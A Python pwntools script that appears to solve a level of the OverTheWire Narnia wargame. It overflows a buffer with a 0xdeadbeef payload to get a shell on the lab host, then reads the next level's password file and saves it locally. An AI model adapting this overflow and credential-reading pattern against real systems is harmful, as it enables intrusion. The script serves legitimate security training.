import os
import pwn

import re

from collections import Counter

from pathlib import Path

pwn.context.log_level = "WARNING"

n = os.path.basename(__file__)
n = n.split(".")[0]
n = n[n.find("narnia")+7:]

n = int(n)

username = f"narnia{n}"
hostname = "narnia.labs.overthewire.org"
password = None 

with open(f"./narnia/password/narnia{n:02}-password.txt") as f:
    password = f.read()

print(f"Connecting to {hostname}:2226")
print(f"Username : {username}")
print(f"Password : {password}")
print() 

connect = pwn.ssh(host=hostname, user=username, password=password, port=2226)

def send_command(command: list[str], connect: pwn.ssh = connect) -> pwn.tubes.ssh.ssh_channel:
    command = map(str, command)
    command = " ".join(command)
    
    print(f"Sending process : `{command}`", end="...")
    channel = connect.system(command)
    print("Done")
    
    print()

    return channel

def connect_remote(host: str = "127.0.0.1", port: int = 8000, timeout: int = None, connect: pwn.ssh = connect) -> pwn.tubes.ssh.ssh_connecter:
    print(f"Connecting to {host}:{port}", end="...")
    remote = connect.connect_remote(host, port, timeout=timeout)
    print("Done")

    print()

    return remote

def send_lines_channel(lines: list[str] | list[bytes], remote: pwn.tubes.ssh.ssh_connecter | pwn.tubes.ssh.ssh_channel) -> None:
    if type(lines[0]) == str:
        lines = [s.encode() for s in lines]

    print(f"Sending {len(lines)} lines", end="...")
    remote.sendlines(lines)
    print("Done")

    print()

def receive_output(channel: pwn.tubes.ssh.ssh_channel | pwn.tubes.ssh.ssh_connecter, lines: int = None, all: bool = False) -> str | bytes:
    output = None
    
    print("Receiving output", end="...")
    try:
        if not lines:
            output = channel.recvall() if all else channel.recv()
        else:
            output = b""

            for _ in range(lines):
                output += channel.recvline()

        output = output.strip(b" ")
        output = output.strip(b"\n")
        print("Done")

    except EOFError:
        if not output:
            print("No output received")

    except Exception as e:
        print(e)
    
    if type(output) == bytes:
        try:
            output = output.decode()
        except Exception as e:
            print(e)
            print()

    print(output)
    print()

    return output

def filter_escape(s: str, allowed: list[str] = [" "]) -> str:
    regex = r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]'
    s = re.sub(regex, '', s)

    res = ""
    i = 0

    while i < len(s):
        if s[i] == "\x1b":
            i += 2
        else:
            res += s[i]
            i += 1

    res = "".join([*filter(lambda t: t and t.isalnum() or t in allowed, res)])

    return res

def save_password(result: str) -> str:
    print(f"Password Found : {result.__repr__()}")

    dir = f"./narnia/password/narnia{int(n)+1:02}-password.txt"

    print(f"Saving password to {dir}", end="...")

    with open(dir, "w+") as f:
        f.write(result)

    print("Done")

    print()

    return dir

def extract_c_code(connect: pwn.ssh = connect) -> Path:
    dir = f"/narnia/narnia{n}.c"
    output_dir = f"./narnia/code/narnia{n:02}.c"

    if os.path.exists(output_dir):
        return Path(output_dir)

    channel = send_command(command=["cat", dir], connect=connect)
    output = receive_output(channel=channel)

    with open(output_dir, "w+") as f:
        f.write(output)

    return Path(output_dir)

def hex_to_ascii(n: int) -> str:
    print(f"Converting {hex(n)} to ASCII :")
    
    t = [n]

    while t[0] != 0:
        if len(t) > 1:
            t = [*divmod(t[0], 0x100)] + [*t[1:]]
        else:
            t = [*divmod(t[0], 0x100)]
    
    t = t[1:]
    t = [*map(chr, t)]

    res = "".join(t)

    print(f"Result found : {res}")
    print()

    return res

if connect.connected():
    dir = f"/narnia/"

    channel = send_command(command=["cd", dir, "&&", "ls"])
    files = receive_output(channel=channel)
    
    code_dir = extract_c_code(connect)

    # test query
    query = "A" * 20 + "test"

    channel = send_command(command=["cd", dir, "&&", "echo", query.__repr__(), "|", f"./narnia{n}"])
    output = receive_output(channel=channel)

    output = output.splitlines()[1:3]
    query, output = [o.split(": ")[-1] for o in output]

    output = int(output, 16)
    converted = hex_to_ascii(output)
    converted = converted[::-1]

    print(f"Query : {query}")
    print(f"Output : {hex(output)}")
    print(f"Converted Output : {converted}")

    print()

    # actual query

    query = "A" * 20 + r"\xef\xbe\xad\xde"

    print(query)

    channel = send_command(command=["cd", dir, "&&", "echo", "-e", f"'{query}'", "|", f"./narnia{n}"])
    output = receive_output(channel=channel)

    output = output.splitlines()[1:3]
    query, output = [o.split(b": ")[-1] for o in output]

    output = int(output, 16)
    converted = hex_to_ascii(output)
    converted = converted[::-1]

    print(f"Query : {query}")
    print(f"Output : {hex(output)}")
    print(f"Converted Output : {converted}")

    print()

    # insert command
    query = "A" * 20 + r"\xef\xbe\xad\xde"

    channel = send_command(command=["cd", dir, "&&", "(", "echo", "-e", f"'{query}';", "cat;", ")", "|", f"./narnia{n}"])
    output = receive_output(channel=channel)

    send_lines_channel(["whoami"], channel)
    output = receive_output(channel=channel)

    send_lines_channel([f"cat /etc/narnia_pass/narnia{n+1}"], channel)
    result = receive_output(channel=channel)
    
    dir = save_password(result)
    
    connect.close()
